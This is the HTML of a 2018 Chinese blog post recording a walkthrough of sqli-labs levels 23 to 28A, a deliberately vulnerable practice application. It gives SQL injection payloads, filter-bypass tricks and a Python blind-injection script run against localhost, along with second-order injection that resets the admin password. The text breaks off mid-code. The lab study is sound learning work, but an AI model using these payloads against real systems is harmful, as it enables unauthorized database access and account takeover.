@@ -1,0 +1,991 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>sqli-labs的学习记录三（23-30） - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-08-17 21:51" pubdate>
+        2018年8月17日 晚上
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:1.9k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli-labs的学习记录三（23-30）</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>七夕什么的，tan90°<br><a id="more"></a></p>
+<h5 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h5><p>测试<br><code>id=1&#39; and &#39;1&#39;=&#39;1</code>时返回正常，测试<code>id=-1&#39; order by 1 #</code>就报错了，查看源代码可以看到我们递交的参数被过滤了–和#<br><img src="/img/2018-08-17/1.png" srcset="/img/static/loading.gif" alt="1"><br><pre><code class="hljs undefined"><span class="hljs-meta">$</span><span class="bash">id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];</span>
+<span class="hljs-meta">$</span><span class="bash">reg = <span class="hljs-string">"/#/"</span>;</span>
+<span class="hljs-meta">$</span><span class="bash">reg1 = <span class="hljs-string">"/--/"</span>;</span>
+<span class="hljs-meta">$</span><span class="bash">replace = <span class="hljs-string">""</span>;</span>
+<span class="hljs-meta">$</span><span class="bash">id = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span>
+<span class="hljs-meta">$</span><span class="bash">id = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span></code></pre></p>
+<p>所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= '<span class="hljs-number">97</span></code></pre></p>
+<p><img src="/img/2018-08-17/2.png" srcset="/img/static/loading.gif" alt="2"><br>python脚本代码<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+txt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),"</span>
+txt2 = <span class="hljs-string">",1)) &gt;= '"</span>
+txt3 = <span class="hljs-string">",1)) = '"</span>
+payload1 = <span class="hljs-number">1</span> 
+payload2 = <span class="hljs-number">97</span>
+txt4 = <span class="hljs-string">'Your Login name'</span>
+num11 = <span class="hljs-number">97</span>
+num12 = <span class="hljs-number">65</span>
+num13 = <span class="hljs-number">48</span>
+code = <span class="hljs-string">''</span>
+num1 = <span class="hljs-number">0</span>
+num2 = <span class="hljs-number">0</span>
+num3 = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):
+	url = txt1+str(i)+txt2+str(num11)
+	req = requests.get(url = url)
+	reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+	<span class="hljs-keyword">if</span>(reqtext == txt4):
+		num1 = <span class="hljs-number">1</span>
+
+	url = txt1+str(i)+txt2+str(num12)
+	req = requests.get(url = url)
+	reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+	<span class="hljs-keyword">if</span>(reqtext == txt4):
+		num2 = <span class="hljs-number">1</span>
+
+	url = txt1+str(i)+txt2+str(num13)
+	req = requests.get(url = url)
+	reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+	<span class="hljs-keyword">if</span>(reqtext == txt4):
+		num3 = <span class="hljs-number">1</span>
+
+
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):
+		num = <span class="hljs-number">97</span>
+		num += <span class="hljs-number">13</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext == txt4):
+			num += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">7</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext == txt4):
+			num += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">3</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext != txt4):
+			num -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>(reqtext == txt4) <span class="hljs-keyword">and</span> ((num == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">119</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):
+		num = <span class="hljs-number">65</span>
+		num += <span class="hljs-number">13</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext == txt4):
+			num += <span class="hljs-number">6</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">7</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext == txt4):
+			num += <span class="hljs-number">3</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">3</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext != txt4):
+			num -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>(reqtext == txt4) <span class="hljs-keyword">and</span> ((num == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">87</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):
+		num =<span class="hljs-number">48</span>
+		num += <span class="hljs-number">5</span>
+		url = txt1+str(i)+txt2+str(num)
+		req = requests.get(url = url)
+		reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+		<span class="hljs-keyword">if</span>(reqtext == txt4):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			num -= <span class="hljs-number">5</span>
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):
+				url = txt1+str(i)+txt3+str(j)
+				req = requests.get(url = url)
+				reqtext = req.text[<span class="hljs-number">554</span>:<span class="hljs-number">569</span>]
+				<span class="hljs-keyword">if</span>(reqtext == txt4):
+					code += chr(j)
+					<span class="hljs-keyword">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span></code></pre></p>
+<p><img src="/img/2018-08-17/3.png" srcset="/img/static/loading.gif" alt="3"></p>
+<h5 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h5><p>这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入<br>从源代码上看login.php、login_create.php都被做了过滤<br><pre><code class="hljs undefined">//login.php
+<span class="hljs-meta">$</span><span class="bash">username = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"login_user"</span>]);</span>
+<span class="hljs-meta">$</span><span class="bash">password = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"login_password"</span>]);</span>
+
+//login_create.php
+<span class="hljs-meta">$</span><span class="bash">username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]) ;</span>
+<span class="hljs-meta">$</span><span class="bash">pass= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);</span>
+<span class="hljs-meta">$</span><span class="bash">re_pass= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'re_password'</span>]);</span></code></pre></p>
+<p>mysql_real_escape_string的作用–&gt;<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">传送门</a><br>mysql_escape_string的作用–&gt;<a href="http://www.gimoo.net/t/1410/542e28a1e826e.html" target="_blank" rel="noopener">传送门</a><br>只有在pass_change.php的username没有做过滤<br><pre><code class="hljs undefined"><span class="hljs-meta">$</span><span class="bash">username= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"username"</span>];</span>
+<span class="hljs-meta">$</span><span class="bash">curr_pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'current_password'</span>]);</span>
+<span class="hljs-meta">$</span><span class="bash">pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);</span>
+<span class="hljs-meta">$</span><span class="bash">re_pass= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'re_password'</span>]);</span></code></pre></p>
+<p>假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名<code>admin&#39;#</code>，在修改<code>admin&#39;#</code>的用户密码的时候会由于mysql更新语句<br><pre><code class="hljs undefined">$sql = "<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">'$pass'</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'$username'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'$curr_pass'</span> <span class="hljs-string">";</span></code></pre></p>
+<p>变为<br><pre><code class="hljs undefined">UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">'pass'</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">'admin'</span>#' <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">'pass'</span> <span class="hljs-string">";</span></code></pre></p>
+<p>这样就可以达到修改admin的密码的目的<br>第一步，构建特殊用户名，密码随意<br><img src="/img/2018-08-17/4.png" srcset="/img/static/loading.gif" alt="4"><br>登陆后修改密码，当前密码不用填，因为已经注释掉了<br><img src="/img/2018-08-17/5.png" srcset="/img/static/loading.gif" alt="5"><br>这样就可以修改admin的密码了<br><pre><code class="hljs undefined">mysql&gt; select <span class="hljs-symbol">*</span> from users;
++----+----------+------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|
++----+----------+------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|
+|<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|
+|<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|
+|<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|
+|<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> 123        </span>|<span class="hljs-string"> 	//admin的默认密码是admin
+</span>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|
+|<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|
+|<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|
+|<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|
+|<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|
+|<span class="hljs-string"> 17 </span>|<span class="hljs-string"> admin'#  </span>|<span class="hljs-string"> 123        </span>|
++----+----------+------------+
+14 rows in set (0.00 sec)</code></pre></p>
+<h5 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h5><p>过滤<code>and</code>和<code>or</code><br>首先测试<code>id=1&#39;</code>报错说明存在单引号注入，测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code>返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了<br><img src="/img/2018-08-17/6.png" srcset="/img/static/loading.gif" alt="6"><br>测试<code>id=1&#39; anandd &#39;1&#39;=&#39;1</code>返回正常说明and只被过滤了一次<br><img src="/img/2018-08-17/7.png" srcset="/img/static/loading.gif" alt="7"><br>只要把and或or双写就可以绕过了<br>还有一种方法是用逻辑运算符代替，用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code></p>
+<h5 id="第二十五A关"><a href="#第二十五A关" class="headerlink" title="第二十五A关"></a>第二十五A关</h5><p>这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&amp;&amp;和||代替和双写绕过<br><pre><code class="hljs undefined">id=1 anandd if(<span class="hljs-name">length</span>(<span class="hljs-name">database</span>())&gt;8,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">10</span>)) #</code></pre></p>
+<p>实测发现可以不用盲注直接注入<br><pre><code class="hljs undefined">id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">database</span>(),3</span></code></pre></p>
+<h5 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h5><p>这关过滤了空格和注释<br><pre><code class="hljs undefined">function blacklist(<span class="hljs-variable">$id</span>)
+&#123;
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/or/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//strip</span> out OR (non <span class="hljs-keyword">case</span> sensitive)
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/and/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//</span>Strip out AND (non <span class="hljs-keyword">case</span> sensitive)
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//strip</span> out /*
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//</span>Strip out --
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#</span>
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\s]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//</span>Strip out spaces
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\\\\]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	<span class="hljs-regexp">//</span>Strip out slashes
+<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;
+&#125;</code></pre></p>
+<p>替换空格的方法有<br><pre><code class="hljs undefined"><span class="xml"></span><span class="perl">%09 --TAB键（水平）</span><span class="xml">
+</span><span class="perl">%0a --新建一行</span><span class="xml">
+</span><span class="perl">%0c --新的一页</span><span class="xml">
+</span><span class="perl">%0d --<span class="hljs-keyword">return</span></span><span class="xml">
+</span><span class="perl">%0b --TAB（垂直）</span><span class="xml">
+</span><span class="perl">%a0 --空格</span><span class="xml"></span></code></pre></p>
+<p>最后一个会报错，在linux下可以，跟apache解析有关，测试payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">-1</span>'%<span class="hljs-number">09</span>anandd%<span class="hljs-number">09</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<p><b style="font-size: 6">然而</b><br>测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b><code>id=1&#39;anandd&#39;1&#39;=&#39;1</code></b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>'anandd(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>)anandd'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<p>有待补充</p>
+<h5 id="第二十六A关"><a href="#第二十六A关" class="headerlink" title="第二十六A关"></a>第二十六A关</h5><p>这一关和上一关一样，只不过sql语句多了括号<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>')anandd(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>)anandd('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<h5 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h5><p>过滤了union和select，下面是过滤代码<br><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span><span class="hljs-params">($id)</span>
+</span>&#123;
+$id= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, $id);	<span class="hljs-comment">//strip out /*</span>
+$id= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, $id);	<span class="hljs-comment">//Strip out --.</span>
+$id= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, $id);	<span class="hljs-comment">//Strip out #.</span>
+$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out spaces.</span>
+$id= preg_replace(<span class="hljs-string">'/select/m'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out spaces.</span>
+$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out spaces.</span>
+$id= preg_replace(<span class="hljs-string">'/union/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out union</span>
+$id= preg_replace(<span class="hljs-string">'/select/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out select</span>
+$id= preg_replace(<span class="hljs-string">'/UNION/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out UNION</span>
+$id= preg_replace(<span class="hljs-string">'/SELECT/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out SELECT</span>
+$id= preg_replace(<span class="hljs-string">'/Union/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out Union</span>
+$id= preg_replace(<span class="hljs-string">'/Select/s'</span>,<span class="hljs-string">""</span>, $id);	    <span class="hljs-comment">//Strip out select</span>
+<span class="hljs-keyword">return</span> $id;
+&#125;</code></pre></p>
+<p>对比二十六关过滤空格的代码少了<br><pre><code class="hljs undefined"><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\s]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-regexp">//</span>Strip out spaces
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\\\\]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	<span class="hljs-regexp">//</span>Strip out slashes</code></pre></p>
+<p>union可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用<code>and&#39;1&#39;=&#39;1</code>闭合<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span>' uniounionn%<span class="hljs-number">09</span>selecselselectectt%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and '<span class="hljs-number">1</span>'='<span class="hljs-number">1</span>
+id=<span class="hljs-number">0</span>'%<span class="hljs-number">09</span>UnIoN%<span class="hljs-number">09</span>sElEcT%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and%<span class="hljs-number">09</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<p><img src="/img/2018-08-17/8.png" srcset="/img/static/loading.gif" alt="8"></p>
+<h5 id="第二十七A关"><a href="#第二十七A关" class="headerlink" title="第二十七A关"></a>第二十七A关</h5><p>和二十七关一样，单引号边双引号，用二十七关的方法即可绕过<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span><span class="hljs-string">"%09UnIoN%09sElEcT%091,database(),3%09and%09"</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span></code></pre></p>
+<h5 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h5><p>这一关过滤了<code>union select</code>，所以要吧这个双写，把过滤代码的注释去掉要再写一次select<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>')%<span class="hljs-number">09</span>uniunion%<span class="hljs-number">09</span>selselectectoN%<span class="hljs-number">09</span>SeLeCt%<span class="hljs-number">091</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">09</span>and%<span class="hljs-number">09</span>('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<h5 id="第二十A关"><a href="#第二十A关" class="headerlink" title="第二十A关"></a>第二十A关</h5><p>源代码把二十八关前面的都注释了，保留了最后一个<br><pre><code class="hljs undefined"><span class="hljs-keyword">function</span> blacklist(<span class="hljs-variable">$id</span>)
+&#123;
